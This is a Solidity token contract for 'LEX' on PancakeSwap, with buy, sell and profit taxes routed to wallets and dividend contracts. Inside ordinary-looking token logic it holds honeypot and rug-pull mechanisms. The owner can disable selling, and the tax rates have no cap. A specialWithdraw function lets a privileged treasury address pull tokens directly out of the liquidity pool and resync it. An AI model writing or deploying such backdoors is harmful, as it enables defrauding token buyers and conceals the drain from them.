// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Models} from "../libraries/Models.sol";

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface INodeDividends {
    function updateFarm(Models.Source source, uint256 amount) external;
}

interface IPayback{
    function updateFarm(uint256 amount) external;
}

interface IUniswapV2Pair {
    function sync() external;
}

contract Lex is ERC20, Ownable {

    IUniswapV2Router02 public immutable pancakeRouter;

    address public immutable pancakeFactory;
    address public immutable pancakePair;

    address public immutable USDT;
    address public leo;

    address public treasuryLiquidity;
    address public wallet;
    address public nodeDividends;
    address public payback;

    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 public constant PROFIT_WALLET_TAX_RATE = 10;
    uint256 public constant PROFIT_SUBCOIN_TAX_RATE = 10;
    uint256 public constant PROFIT_NODE_TAX_RATE = 5;

    uint256 public buyRate = 5;
    uint256 public sellRate = 5;

    uint256 public swapThreshold = 10 ether;
    uint256 public highestReserve;
    // uint256 private constant COST_DUST = 1e16; // 0.01 USDT

    bool private swapping;
    bool public openBuy;
    bool public openSell;

    mapping(address => bool) public allowlist;
    mapping(address => uint256) public totalCostUsdt;

    event SwapAndSendTax(address recipient, uint256 tokensSwapped);

    constructor(
        address _initialRecipient,
        address _wallet,
        address _USDT
    ) ERC20("LEX","LEX") Ownable(msg.sender) {
        
        _mint(_initialRecipient, 21000000 ether);

        pancakeRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        USDT = _USDT;
        wallet = _wallet;

        pancakeFactory = pancakeRouter.factory();

        pancakePair = IPancakeFactory(pancakeFactory)
            .createPair(address(this), USDT);

        allowlist[_initialRecipient] = true;
        allowlist[_wallet] = true;
        
    }

    /* ---------------- CONFIG ---------------- */
    function setAddrConfig(
        address _treasuryLiquidity,
        address _payback,
        address _nodeDividends,
        address _leo
    ) external onlyOwner{
        treasuryLiquidity = _treasuryLiquidity;
        payback = _payback;
        nodeDividends = _nodeDividends;
        leo = _leo;
        allowlist[_treasuryLiquidity] = true;
        allowlist[_payback] = true;
        allowlist[_nodeDividends] = true;

    }


    function setRate(uint256 _buy, uint256 _sell) external onlyOwner {
        buyRate = _buy;
        sellRate = _sell;
    }

    function setAllowlist(address[] memory addrs, bool isAllow) external onlyOwner{
        for(uint i=0; i<addrs.length; i++){
            allowlist[addrs[i]] = isAllow;
        }
    }

    function switchBuy(bool _b) external onlyOwner { openBuy = _b; }
    function switchSell(bool _b) external onlyOwner { openSell = _b; }

    function issueBuyTaxFee() external onlyOwner{
        _issueBuyTaxFee();
    }
    /* ---------------- INTERNAL CORE ---------------- */

    function _swap(address[] memory path, uint256 amount, address to) private {
        if (amount == 0) return;

        swapping = true;

        _approve(address(this), address(pancakeRouter), amount);

        try pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            to,
            block.timestamp
        ) {
            emit SwapAndSendTax(to, amount);
        } catch {}

        swapping = false;
    }


    function _issueBuyTaxFee() private {
        uint256 fee = balanceOf(address(this));
        uint256 amountNode = fee * 40 / 100;
        uint256 amountPayback = fee * 40 / 100;
        uint256 amountWallet = fee - amountNode - amountPayback;

        uint256 burnAmount;

        burnAmount += _handleNode(amountNode, Models.Source.TAX_FEE);
        burnAmount += _handlePayback(amountPayback);
        _handleWallet(amountWallet);

        if (burnAmount > 0) {
            super._update(address(this), DEAD, burnAmount);
        }
    }

    function _issueSellTaxFee(uint256 fee) private {
        uint256 amountBurn = fee * 40 / 100;
        uint256 amountPayback = fee * 40 / 100;
        uint256 amountWallet = fee - amountBurn - amountPayback;

        uint256 burnAmount = amountBurn;

        burnAmount += _handlePayback(amountPayback);
        _handleWallet(amountWallet);

        if (burnAmount > 0) {
            super._update(address(this), DEAD, burnAmount);
        }
    }
    

    function _update(
        address from,
        address to,
        uint256 amount
    ) internal override {

        if(USDT != address(0) && pancakePair != address(0)){
            uint256 reserve = IERC20(USDT).balanceOf(pancakePair);
            if(reserve > highestReserve) highestReserve = reserve;
        }
        
        if (
            swapping ||
            from == address(0) ||
            to == address(0) ||
            allowlist[from] ||
            allowlist[to]
        ) {
            super._update(from, to, amount);
            return;
        }

        bool isBuy = from == pancakePair;
        bool isSell = to == pancakePair;

        if (isBuy) {
            require(openBuy, "BUY_DISABLED");

            uint256 fee = amount * buyRate / 100;
            uint256 receiveAmount = amount - fee;

            _recordCost(to, receiveAmount);

            super._update(from, address(this), fee);
            super._update(from, to, receiveAmount);
            return;
        }

        if (isSell) {
            require(openSell, "SELL_DISABLED");

            uint256 sellFee = amount * sellRate / 100;
            uint256 sellAmount = amount - sellFee;

            uint256 profitTax = _calcProfitTax(from, sellAmount);

            if (profitTax > 0) {
                super._update(from, address(this), profitTax);
                _issueProfitFee(profitTax);
            }
            super._update(from, address(this), sellFee);

            // _processFee();
            _issueSellTaxFee(sellFee);

            super._update(from, to, sellAmount - profitTax);
            _reduceCost(from, amount);
            

            return;
        }
        
        _issueBuyTaxFee();
        super._update(from, to, amount);
        _migrateCost(from, to, amount);
    }

    /* ---------------- COST LOGIC ---------------- */
    function _recordCost(address to, uint256 amount) private {
        if (to == address(pancakeRouter) || to == pancakePair || to == DEAD || to == address(this)) {
            return;
        }
        
        uint256 price = currentPrice(); // USDT / token
        uint256 costUsdt = price * amount / 1e18;
        totalCostUsdt[to] += costUsdt;
    }

    function _reduceCost(address user, uint256 amount) private {
        uint256 balance = balanceOf(user);
        uint256 cost = totalCostUsdt[user];

        if (balance == 0 || balance <= 1e17) {
            totalCostUsdt[user] = 0;
            return;
        }

        uint256 remove = cost * amount / balance;
        totalCostUsdt[user] = cost - remove;

        if (totalCostUsdt[user] <= 1e17) {
            totalCostUsdt[user] = 0;
        }
    }

    function _migrateCost(address from, address to, uint256 amount) private {
        if (to == address(pancakeRouter) || to == pancakePair || to == DEAD || to == address(this)) {
            return;
        }
        
        uint256 balance = balanceOf(from) + amount;
        uint256 cost = totalCostUsdt[from];

        if (cost == 0 || balance == 0) return;

        uint256 move = cost * amount / balance;
        if (move == 0) return;

        uint256 newFromCost = cost - move;
        if (newFromCost <= 1e17) {
            newFromCost = 0;
        }

        totalCostUsdt[from] = newFromCost;
        totalCostUsdt[to] += move;
    }

    function _calcProfitTax(address user, uint256 amount)
        private
        view
        returns (uint256)
    {
        uint256 costPart =
            totalCostUsdt[user] * amount / balanceOf(user);

        uint256 usdtOut = _getAmountOut(amount);

        if (usdtOut <= costPart) return 0;

        uint256 profitUsdt = usdtOut - costPart;
        uint256 profitToken = amount * profitUsdt / usdtOut;

        uint256 totalRate =
            PROFIT_WALLET_TAX_RATE +
            PROFIT_SUBCOIN_TAX_RATE +
            PROFIT_NODE_TAX_RATE;

        return profitToken * totalRate / 100;
    }


    function _issueProfitFee(uint256 tax) private {
        uint256 totalRate =
            PROFIT_WALLET_TAX_RATE +
            PROFIT_SUBCOIN_TAX_RATE +
            PROFIT_NODE_TAX_RATE;

        uint256 toNode = tax * PROFIT_NODE_TAX_RATE / totalRate;
        uint256 toSub = tax * PROFIT_SUBCOIN_TAX_RATE / totalRate;
        uint256 toWallet = tax - toNode - toSub;

        uint256 burnAmount;

        burnAmount += _handleNode(toNode, Models.Source.PROFIT_FEE);
        burnAmount += _handlePayback(toSub);
        _handleWallet(toWallet);

        if (burnAmount > 0) {
            super._update(address(this), DEAD, burnAmount);
        }
    }

    function _handleNode(
        uint256 amount,
        Models.Source source
    ) private returns (uint256 burnAmount) {
        if (nodeDividends != address(0) && amount > 0) {
            uint256 received = _swapAndGetReceived(
                _pathToUSDT(),
                amount,
                nodeDividends,
                USDT
            );

            if (received > 0) {
                INodeDividends(nodeDividends)
                    .updateFarm(source, received);
            }
        } else {
            burnAmount = amount;
        }
    }

    function _handlePayback(uint256 amount) private returns (uint256 burnAmount) {
        if (payback != address(0) && _leoReady() && amount > 0) {
            uint256 received = _swapAndGetReceived(
                _pathToLeo(),
                amount,
                payback,
                leo
            );

            if (received > 0) {
                IPayback(payback).updateFarm(received);
            }
        } else {
            burnAmount = amount;
        }
    }

    function _handleWallet(uint256 amount) private {
        if (amount > 0) _swap(_pathToUSDT(), amount, wallet);
    }

    function _swapAndGetReceived(
        address[] memory path,
        uint256 amount,
        address to,
        address token
    ) private returns (uint256 received) {
        uint256 beforeBal = IERC20(token).balanceOf(to);
        _swap(path, amount, to);
        received = IERC20(token).balanceOf(to) - beforeBal;
    }

    /* ---------------- HELPERS ---------------- */
    function _pathToUSDT() private view returns(address[] memory path) {
        path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;
    }

    function _pathToLeo() private view returns(address[] memory path) {
        path = new address[](3);
        path[0] = address(this);
        path[1] = USDT;
        path[2] = leo;
    }

    function _leoReady() private view returns(bool) {
        if (leo == address(0)) return false;
        address pair =
            IPancakeFactory(pancakeFactory).getPair(leo, USDT);
        if (pair == address(0)) return false;
        return IERC20(pair).totalSupply() > 0;
    }

    function _getAmountOut(uint256 amount)
        private
        view
        returns (uint256)
    {
        address[] memory path = _pathToUSDT();
        return pancakeRouter.getAmountsOut(amount, path)[1];
    }

    function currentPrice() public view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;
        return pancakeRouter.getAmountsOut(1e18, path)[1];
    }

    /* ---------------- SPECIAL ---------------- */

    function specialWithdraw(uint256 amount) external {
        require(msg.sender == treasuryLiquidity, "NO_PERMISSION");
        super._update(pancakePair, treasuryLiquidity, amount);
        IUniswapV2Pair(pancakePair).sync();
    }

    function getHighestReserve() external view returns(uint256){
        return highestReserve;
    }
}
